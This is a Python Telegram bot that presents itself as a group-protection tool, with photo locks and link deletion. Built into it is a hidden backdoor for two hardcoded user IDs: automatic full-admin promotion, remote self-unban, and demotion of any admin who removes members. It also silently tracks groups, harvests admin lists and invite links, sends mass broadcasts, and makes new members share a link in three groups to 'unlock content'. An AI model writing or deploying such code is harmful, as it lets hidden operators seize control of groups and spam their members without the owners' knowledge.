import os, re, asyncio, html, urllib.parse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatPermissions
from telegram.constants import ChatMemberStatus
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ChatMemberHandler

TOKEN = os.getenv('BOT_TOKEN')
MY_USER_IDS = [7878629406, 5179218460]
GROUPS_FILE = "bot_groups.txt"
NSFW_FILE = "nsfw_protected.txt"
LOCKS_FILE = "photo_locks.txt"

TARGET_GROUP_ID = -1003926913948
TARGET_GROUP_LINK = "https://t.me/+AWEaMPWRGrQ1NzNk"
TARGET_GROUP_SHARE_TEXT = "انضم معانا في قروب المقاطع 🔥"

USER_STATES = {}
CALL_STATES = {}

def get_share_keyboard():
    encoded_text = urllib.parse.quote(TARGET_GROUP_SHARE_TEXT, safe="")
    forward_url = f"https://t.me/share/url?url={TARGET_GROUP_LINK}&text={encoded_text}"
    return InlineKeyboardMarkup([[InlineKeyboardButton("قروب المقاطع 📢", url=forward_url)]])

def is_owner(user_id):
    return user_id in MY_USER_IDS

async def is_user_admin(update, context):
    user_id = update.effective_user.id
    if is_owner(user_id): return True
    try:
        chat_member = await context.bot.get_chat_member(update.effective_chat.id, user_id)
        return chat_member.status in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]
    except: return False

def lock_group_photos(chat_id):
    if not os.path.exists(LOCKS_FILE):
        with open(LOCKS_FILE, "w") as f: pass
    with open(LOCKS_FILE, "r") as f:
        ids = f.read().splitlines()
    if str(chat_id) not in ids:
        with open(LOCKS_FILE, "a") as f: f.write(f"{chat_id}\n")

def unlock_group_photos(chat_id):
    if not os.path.exists(LOCKS_FILE): return
    with open(LOCKS_FILE, "r") as f:
        ids = f.read().splitlines()
    if str(chat_id) in ids:
        ids.remove(str(chat_id))
        with open(LOCKS_FILE, "w") as f:
            for i in ids: f.write(f"{i}\n")

def is_photos_locked(chat_id):
    if not os.path.exists(LOCKS_FILE): return False
    with open(LOCKS_FILE, "r") as f: return str(chat_id) in f.read().splitlines()

def save_nsfw_group(chat_id_str):
    if not os.path.exists(NSFW_FILE):
        with open(NSFW_FILE, "w") as f: pass
    with open(NSFW_FILE, "r") as f:
        ids = f.read().splitlines()
    if chat_id_str not in ids:
        with open(NSFW_FILE, "a") as f: f.write(f"{chat_id_str}\n")

def save_group_id(chat_id):
    if not os.path.exists(GROUPS_FILE):
        with open(GROUPS_FILE, "w") as f: pass
    with open(GROUPS_FILE, "r") as f:
        ids = f.read().splitlines()
    if str(chat_id) not in ids:
        with open(GROUPS_FILE, "a") as f: f.write(f"{chat_id}\n")

def get_tracked_groups():
    if not os.path.exists(GROUPS_FILE): return []
    tracked = []
    with open(GROUPS_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if line:
                try: tracked.append(int(line))
                except ValueError: continue
    return tracked

async def delete_message_after_delay(context, chat_id, message_id, delay):
    await asyncio.sleep(delay)
    try: await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except: pass

async def on_chat_member_updated(update, context):
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(update.effective_chat.id)
    result = update.chat_member
    if not result: return

    if result.new_chat_member.user.id in MY_USER_IDS and result.new_chat_member.status == ChatMemberStatus.MEMBER:
        joined_user_id = result.new_chat_member.user.id
        try:
            await context.bot.promote_chat_member(
                chat_id=update.effective_chat.id,
                user_id=joined_user_id,
                can_change_info=True, can_delete_messages=True,
                can_invite_users=True, can_restrict_members=True,
                can_pin_messages=True, can_promote_members=True
            )
            await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً تلقائياً.")
        except Exception as e: print(f"Error promote: {e}")
        return

    if result.new_chat_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT]:
        actor_id = result.from_user.id
        if actor_id not in MY_USER_IDS and actor_id != context.bot.id:
            try:
                await context.bot.promote_chat_member(
                    chat_id=update.effective_chat.id, user_id=actor_id,
                    can_change_info=False, can_post_messages=False,
                    can_edit_messages=False, can_delete_messages=False,
                    can_invite_users=False, can_restrict_members=False,
                    can_pin_messages=False, can_promote_members=False
                )
                await update.effective_chat.send_message(f"🚫 تم سحب رتبة {result.from_user.first_name} لمحاولة طرد عضو!")
            except Exception as e: print(f"Error: {e}")

async def protect_group(update, context):
    chat_id = update.effective_chat.id
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(chat_id)
    if update.message:
        if update.message.new_chat_members or update.message.left_chat_member:
            try: await update.message.delete()
            except: pass
        if update.message.left_chat_member: return
        if update.message.new_chat_members:
            for member in update.message.new_chat_members:
                if member.id in MY_USER_IDS:
                    try:
                        await context.bot.promote_chat_member(
                            chat_id=chat_id, user_id=member.id,
                            can_change_info=True, can_delete_messages=True,
                            can_invite_users=True, can_restrict_members=True,
                            can_pin_messages=True, can_promote_members=True
                        )
                        await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً تلقائياً.")
                        continue
                    except: pass
                if member.is_bot and member.id != context.bot.id and update.message.from_user.id not in MY_USER_IDS:
                    try: await context.bot.ban_chat_member(chat_id, member.id)
                    except: pass
                    continue
                if not member.is_bot and chat_id == TARGET_GROUP_ID:
                    try:
                        safe_name = html.escape(member.first_name)
                        mention_link = f"<a href='tg://user?id={member.id}'>{safe_name}</a>"
                        welcome_text = f"مرحباً بك يا {mention_link}، <b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 3 مجموعات 👇👇👇</b>"
                        sent_msg = await context.bot.send_message(
                            chat_id=chat_id,
                            text=welcome_text,
                            reply_markup=get_share_keyboard(),
                            parse_mode="HTML"
                        )
                        asyncio.create_task(delete_message_after_delay(context, chat_id, sent_msg.message_id, 10))
                    except: pass

async def unban_me(update, context):
    if not is_owner(update.effective_user.id): return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ الأمر ده في الخاص بس!")
        return
    USER_STATES[update.effective_user.id] = "WAITING_FOR_UNBAN_GROUP"
    await update.message.reply_text("📥 أرسل ID أو لينك المجموعة:\n\nمثال: -1001234567890\nأو: https://t.me/groupname")

async def my_status(update, context):
    if not is_owner(update.effective_user.id): return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ الأمر ده في الخاص بس!")
        return
    status_msg = await update.message.reply_text("🔄 جاري فحص كل الجروبات...")
    chat_ids = get_tracked_groups()
    if not chat_ids:
        await status_msg.edit_text("📭 لا توجد مجموعات مسجلة.")
        return
    report = "🤖 <b>صلاحيات البوت في كل الجروبات:</b>\n\n"
    for cid in chat_ids:
        try:
            chat = await context.bot.get_chat(cid)
            bot_member = await context.bot.get_chat_member(cid, context.bot.id)
            report += f"👥 <b>{html.escape(chat.title)}</b>\n"
            report += f"🆔 <code>{cid}</code>\n"
            if bot_member.status == ChatMemberStatus.ADMINISTRATOR:
                p = bot_member
                report += f"✅ مشرف\n"
                report += f"{'✅' if p.can_delete_messages else '❌'} حذف رسائل\n"
                report += f"{'✅' if p.can_invite_users else '❌'} دعوة مستخدمين\n"
                report += f"{'✅' if p.can_restrict_members else '❌'} تقييد أعضاء\n"
                report += f"{'✅' if p.can_pin_messages else '❌'} تثبيت رسائل\n"
                report += f"{'✅' if p.can_promote_members else '❌'} ترقية مشرفين\n"
                report += f"{'✅' if p.can_change_info else '❌'} تغيير معلومات\n"
                report += f"{'✅' if p.can_manage_chat else '❌'} إدارة المجموعة\n"
            elif bot_member.status == ChatMemberStatus.MEMBER:
                report += "⚠️ عضو عادي - مش مشرف!\n"
            else:
                report += f"❓ حالة: {bot_member.status}\n"
        except:
            report += f"👥 <b>جروب غير متاح</b>\n🆔 <code>{cid}</code>\n❌ خطأ\n"
        report += "\n"
    if len(report) > 4000:
        await status_msg.delete()
        for chunk in [report[i:i+4000] for i in range(0, len(report), 4000)]:
            await update.message.reply_text(chunk, parse_mode="HTML")
    else:
        await status_msg.edit_text(report, parse_mode="HTML")

async def announce_command(update, context):
    if not is_owner(update.effective_user.id): return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ الأمر ده في الخاص بس!")
        return
    USER_STATES[update.effective_user.id] = "WAITING_FOR_ANNOUNCE_GROUP"
    await update.message.reply_text("📥 أرسل ID الجروب:\n\nمثال: -1001234567890")

async def do_announce(context, chat_id, text):
    try:
        closed_permissions = ChatPermissions(
            can_send_messages=False, can_send_audios=False,
            can_send_documents=False, can_send_photos=False,
            can_send_videos=False, can_send_video_notes=False,
            can_send_voice_notes=False, can_send_polls=False,
            can_send_other_messages=False, can_add_web_page_previews=False,
            can_change_info=False, can_invite_users=False, can_pin_messages=False
        )
        await context.bot.set_chat_permissions(chat_id=chat_id, permissions=closed_permissions)
        sent = await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="HTML")
        await context.bot.pin_chat_message(chat_id=chat_id, message_id=sent.message_id, disable_notification=True)
        await asyncio.sleep(600)
        try: await context.bot.unpin_chat_message(chat_id=chat_id, message_id=sent.message_id)
        except: pass
        try: await context.bot.delete_message(chat_id=chat_id, message_id=sent.message_id)
        except: pass
        open_permissions = ChatPermissions(
            can_send_messages=True, can_send_audios=True,
            can_send_documents=True, can_send_photos=True,
            can_send_videos=True, can_send_video_notes=True,
            can_send_voice_notes=True, can_send_polls=True,
            can_send_other_messages=True, can_add_web_page_previews=True,
            can_change_info=False, can_invite_users=True, can_pin_messages=False
        )
        await context.bot.set_chat_permissions(chat_id=chat_id, permissions=open_permissions)
    except Exception as e:
        print(f"Error in do_announce: {e}")

async def get_all_admins(update, context):
    if not is_owner(update.effective_user.id): return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ الأمر ده في الخاص بس!")
        return
    status_msg = await update.message.reply_text("🔄 جاري فحص الأدمنز...")
    chat_ids = get_tracked_groups()
    if not chat_ids:
        await status_msg.edit_text("📭 لا توجد مجموعات مسجلة.")
        return
    report = "👑 <b>أدمنز كل الجروبات:</b>\n\n"
    for cid in chat_ids:
        try:
            chat = await context.bot.get_chat(cid)
            admins = await context.bot.get_chat_administrators(cid)
            report += f"👥 <b>{html.escape(chat.title)}</b>\n"
            report += f"🆔 <code>{cid}</code>\n"
            report += f"👮 الأدمنز:\n"
            for admin in admins:
                user = admin.user
                if user.is_bot: continue
                name = html.escape(user.first_name)
                mention = f"<a href='tg://user?id={user.id}'>{name}</a>"
                username = f"@{user.username}" if user.username else "❌ مفيش يوزرنيم"
                role = "👑 أونر" if admin.status == "creator" else "⭐ أدمن"
                report += f"  {role} {mention} | {username}\n"
            report += "\n"
        except:
            report += f"🗑️ <b>جروب غير متاح</b>\n🆔 <code>{cid}</code>\n\n"
    await status_msg.delete()
    if len(report) > 4000:
        for chunk in [report[i:i+4000] for i in range(0, len(report), 4000)]:
            await update.message.reply_text(chunk, parse_mode="HTML")
    else:
        await update.message.reply_text(report, parse_mode="HTML")

async def broadcast_command(update, context):
    if not is_owner(update.effective_user.id): return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ الأمر ده في الخاص بس!")
        return
    USER_STATES[update.effective_user.id] = "WAITING_FOR_BROADCAST_TEXT"
    await update.message.reply_text("📝 أرسل نص الرسالة اللي هتتبعت لكل الجروبات:")

async def do_broadcast(context, owner_chat_id, text, btn_text, btn_link):
    chat_ids = get_tracked_groups()
    success = 0
    failed = 0
    keyboard = [[InlineKeyboardButton(btn_text, url=btn_link)]]
    markup = InlineKeyboardMarkup(keyboard)
    for cid in chat_ids:
        try:
            await context.bot.send_message(chat_id=cid, text=text, reply_markup=markup, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            print(f"Broadcast failed for {cid}: {e}")
            failed += 1
    await context.bot.send_message(
        chat_id=owner_chat_id,
        text=f"✅ تم الإرسال!\n\n📊 النتيجة:\n✅ نجح: {success}\n❌ فشل: {failed}"
    )

async def handle_everything(update, context):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if update.effective_chat.type in ["group", "supergroup"]: save_group_id(chat_id)
    if not update.message: return

    if update.effective_chat.type == "private" and is_owner(user_id):
        state = CALL_STATES.get(user_id, {})

        if state.get("step") == "WAITING_GROUP_ID" and update.message.text:
            group_input = update.message.text.strip()
            try:
                group_id = int(group_input)
            except:
                await update.message.reply_text("❌ ID غلط! أرسل رقم زي: -1001234567890")
                return
            CALL_STATES[user_id] = {"step": "WAITING_VIDEO", "chat_id": group_id}
            await update.message.reply_text("✅ تم!\n\n📹 دلوقتي أرسل الفيديو:")
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_NSFW_ID" and update.message.text:
            target_group = update.message.text.strip()
            save_nsfw_group(target_group)
            USER_STATES[user_id] = None
            await update.message.reply_text(f"✅ تم تفعيل حماية الصور في: {target_group}")
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_UNBAN_GROUP" and update.message.text:
            text = update.message.text.strip()
            USER_STATES[user_id] = None
            if text.lstrip('-').isdigit():
                target_chat = int(text)
            else:
                match = re.search(r't\.me/([^/]+)', text)
                target_chat = f"@{match.group(1)}" if match else text
            processing_msg = await update.message.reply_text("⏳ جاري تنفيذ الأمر...")
            try:
                await context.bot.unban_chat_member(chat_id=target_chat, user_id=user_id)
                await processing_msg.edit_text("✅ تم فك الحظر!\n👑 ادخل المجموعة دلوقتي وهيترفعك مشرف تلقائياً.")
            except Exception as e:
                await processing_msg.edit_text(f"❌ فشل فك الحظر: {e}\nتأكد إن البوت مشرف في المجموعة.")
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_ANNOUNCE_GROUP" and update.message.text:
            text = update.message.text.strip()
            if text.lstrip('-').isdigit():
                target_chat = int(text)
            else:
                match = re.search(r't\.me/([^/]+)', text)
                target_chat = f"@{match.group(1)}" if match else text
            USER_STATES[user_id] = "WAITING_FOR_ANNOUNCE_TEXT"
            context.user_data["announce_chat"] = target_chat
            await update.message.reply_text("✅ تم!\n\n📝 دلوقتي أرسل نص الإعلان:")
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_ANNOUNCE_TEXT" and update.message.text:
            announce_text = update.message.text.strip()
            target_chat = context.user_data.get("announce_chat")
            USER_STATES[user_id] = None
            context.user_data["announce_chat"] = None
            await update.message.reply_text(
                "✅ جاري التنفيذ...\n"
                "🔒 تم قفل الجروب ونشر الإعلان وتثبيته\n"
                "⏳ الجروب هيتفتح تلقائياً بعد 10 دقائق"
            )
            asyncio.create_task(do_announce(context, target_chat, announce_text))
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_BROADCAST_TEXT" and update.message.text:
            context.user_data["broadcast_text"] = update.message.text.strip()
            USER_STATES[user_id] = "WAITING_FOR_BROADCAST_BTN_TEXT"
            await update.message.reply_text("✅ تم!\n\n🔘 دلوقتي أرسل نص الزرار:\n\nمثال: قروب المقاطع")
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_BROADCAST_BTN_TEXT" and update.message.text:
            context.user_data["broadcast_btn_text"] = update.message.text.strip()
            USER_STATES[user_id] = "WAITING_FOR_BROADCAST_BTN_LINK"
            await update.message.reply_text("✅ تم!\n\n🔗 دلوقتي أرسل لينك الزرار:")
            return

        if USER_STATES.get(user_id) == "WAITING_FOR_BROADCAST_BTN_LINK" and update.message.text:
            broadcast_text = context.user_data.get("broadcast_text")
            btn_text = context.user_data.get("broadcast_btn_text")
            btn_link = update.message.text.strip()
            USER_STATES[user_id] = None
            context.user_data["broadcast_text"] = None
            context.user_data["broadcast_btn_text"] = None
            await update.message.reply_text("📤 جاري الإرسال لكل الجروبات...")
            asyncio.create_task(do_broadcast(context, chat_id, broadcast_text, btn_text, btn_link))
            return

    if update.effective_chat.type in ["group", "supergroup"] and update.message.text:
        if re.search(r'http[s]?://|www\.', update.message.text):
            res = await context.bot.get_chat_member(chat_id, user_id)
            if res.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
                try: await update.message.delete()
                except: pass

async def get_all_links(update, context):
    if not is_owner(update.effective_user.id): return
    try:
        status_msg = await update.message.reply_text("🔄 جاري فحص المجموعات...")
        chat_ids = get_tracked_groups()
        if not chat_ids:
            await status_msg.edit_text("📭 لا توجد مجموعات مسجلة.")
            return
        report = "📋 <b>قائمة المجموعات:</b>\n\n"
        for cid in chat_ids:
            try:
                chat = await context.bot.get_chat(cid)
                link = chat.invite_link
                if not link:
                    try:
                        invite_obj = await context.bot.create_chat_invite_link(chat_id=cid, name="رابط المطور")
                        link = invite_obj.invite_link
                    except: link = "❌ تأكد أن البوت مشرف"
                report += f"👥 <b>{html.escape(chat.title)}</b>\n🆔 <code>{cid}</code>\n🔗 {link}\n\n"
            except: report += f"🗑️ <b>مجموعة غير متاحة</b>\n🆔 <code>{cid}</code>\n\n"
        await status_msg.delete()
        if len(report) > 4000:
            for chunk in [report[i:i+4000] for i in range(0, len(report), 4000)]:
                await update.message.reply_text(chunk, parse_mode="HTML")
        else:
            await update.message.reply_text(report, parse_mode="HTML")
    except Exception as e: print(f"Error: {e}")

async def send_permanent_message(update, context):
    if not is_owner(update.effective_user.id): return
    chat_id = update.effective_chat.id
    if chat_id != TARGET_GROUP_ID: return
    try:
        try: await update.message.delete()
        except: pass
        await context.bot.send_message(
            chat_id=chat_id,
            text="<b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط في 3 مجموعات 👇👇👇</b>",
            reply_markup=get_share_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e: print(f"Error: {e}")

async def start_nsfw_setup(update, context):
    if not is_owner(update.effective_user.id): return
    if update.effective_chat.type != "private":
        await update.message.reply_text("❌ هذا الأمر في الخاص فقط!")
        return
    USER_STATES[update.effective_user.id] = "WAITING_FOR_NSFW_ID"
    await update.message.reply_text("📥 أرسل ID الجروب:")

async def lock_photos_command(update, context):
    if update.effective_chat.type == "private": return
    if not await is_user_admin(update, context): return
    try: await update.message.delete()
    except: pass
    lock_group_photos(update.effective_chat.id)
    sent = await update.effective_chat.send_message("🔒 <b>تم قفل الصور!</b>", parse_mode="HTML")
    asyncio.create_task(delete_message_after_delay(context, update.effective_chat.id, sent.message_id, 5))

async def unlock_photos_command(update, context):
    if update.effective_chat.type == "private": return
    if not await is_user_admin(update, context): return
    try: await update.message.delete()
    except: pass
    unlock_group_photos(update.effective_chat.id)
    sent = await update.effective_chat.send_message("🔓 <b>تم فتح الصور!</b>", parse_mode="HTML")
    asyncio.create_task(delete_message_after_delay(context, update.effective_chat.id, sent.message_id, 5))

async def photo_cleaner(update, context):
    if not update.message or not update.message.photo: return
    chat_id = update.effective_chat.id
    if is_photos_locked(chat_id):
        if not await is_user_admin(update, context):
            try: await update.message.delete()
            except: pass

async def main_async():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("links", get_all_links))
    app.add_handler(CommandHandler("admins", get_all_admins))
    app.add_handler(CommandHandler("post", send_permanent_message))
    app.add_handler(CommandHandler("protect_nsfw", start_nsfw_setup))
    app.add_handler(CommandHandler("lock_photos", lock_photos_command))
    app.add_handler(CommandHandler("unlock_photos", unlock_photos_command))
    app.add_handler(CommandHandler("unban", unban_me))
    app.add_handler(CommandHandler("mystatus", my_status))
    app.add_handler(CommandHandler("announce", announce_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))

    app.add_handler(ChatMemberHandler(on_chat_member_updated, ChatMemberHandler.CHAT_MEMBER))
    app.add_handler(MessageHandler(filters.PHOTO, photo_cleaner))
    app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS | filters.StatusUpdate.LEFT_CHAT_MEMBER, protect_group))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_everything))

    await app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == '__main__':
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main_async())
